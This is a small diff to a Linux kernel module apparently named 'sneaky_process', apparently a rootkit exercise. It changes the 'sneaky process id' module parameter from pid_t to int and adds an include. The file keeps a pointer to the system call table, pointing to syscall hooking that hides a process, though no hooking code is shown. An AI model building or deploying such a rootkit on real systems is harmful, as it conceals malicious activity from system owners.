@@ -8,11 +8,13 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/moduleparam.h>
+// #include <linux/sched.h>
 
 #define PREFIX "sneaky_process"
 
-static pid_t pid = 0;
-module_param(spid, pid_t, 0);
+static int spid = 0;
+module_param(spid, int, 0);
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 MODULE_PARM_DESC(spid, "sneaky process id");
